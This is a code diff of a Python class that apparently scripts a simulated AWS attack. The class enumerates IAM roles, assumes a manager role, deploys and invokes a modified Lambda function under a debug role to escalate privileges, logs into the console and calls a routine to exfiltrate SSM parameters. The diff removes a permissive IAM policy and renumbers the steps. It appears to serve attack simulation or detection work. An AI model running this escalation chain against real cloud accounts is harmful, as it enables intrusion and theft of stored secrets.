@@ -11,22 +11,6 @@ import tempfile
 file_path = './api/lambda_privesc/lambda_function.py'
 zip_file_path = './api/lambda_privesc/lambda_function.py.zip'
 
-iam_policy = {
-    "Version": "2012-10-17",
-    "Statement": [
-        {
-            "Sid": "sean",
-            "Effect": "Allow",
-            "Action": [
-                "sts:AssumeRole",
-                "iam:List*",
-                "iam:Get*"
-            ],
-            "Resource": "*"
-        }
-    ]
-}
-
 class AttackLambdaPriEsc:
     def __init__(self, id, aws_region, instance, pathToDisk):
         self.id = id
@@ -46,9 +30,6 @@ class AttackLambdaPriEsc:
             self.step = 1
             iam_enum = IAMEnum(self.user_name,self.user_access_key, self.user_secret_key,self.aws_region)
             self.instance["logs"].append(f"User {self.user_name} enumerated IAM permissions.")
-            self._add_to_disk()
-            
-            self.step = 2
             iam_enum.noise_enum(self.instance["exchange"], self.instance["logs"])
             self._add_to_disk()
             
@@ -56,7 +37,7 @@ class AttackLambdaPriEsc:
             iam_enum.iam_role_enum(debug_role,self.instance["exchange"], self.instance["logs"])
             self._add_to_disk()
 
-            self.step = 3
+            self.step = 2
             manager_role = self.instance['resources'][4]['role']
             iam_enum.iam_role_enum(manager_role, self.instance["exchange"], self.instance["logs"])
             self._add_to_disk()
@@ -68,22 +49,21 @@ class AttackLambdaPriEsc:
             self._add_to_disk()
             time.sleep(15)
             
-            self.step = 4
+            self.step = 3
             sts_response = assume_role(self.user_access_key, self.user_secret_key, manager_role_arn, manager_role, self.instance["exchange"], self.instance["logs"])
             _replace_string_in_file_and_zip(self.user_name)
-            self._create_function_and_invoke(self.id, sts_response,debug_role_arn, self.instance['exchange'], self.instance['logs'], self.instance['resources'])
+            self._create_function_and_invoke(self.id, sts_response, debug_role_arn, self.instance['exchange'], self.instance['logs'], self.instance['resources'])
             self._add_to_disk()
 
-            self.step = 5
             iam_enum.list_attached_user_policies(self.user_name, self.instance['exchange'], self.instance['logs'])
             self._add_to_disk()
             time.sleep(10)
 
-            self.step = 6
+            self.step = 4
             console_login(self.user_name, self.user_access_key, self.user_secret_key,self.instance['exchange'], self.instance['logs'])
             self._add_to_disk()
 
-            self.step = 7
+            self.step = 5
             self.exfil_ssm_params()
             self.status = 'attack_complete'
             self._add_to_disk()
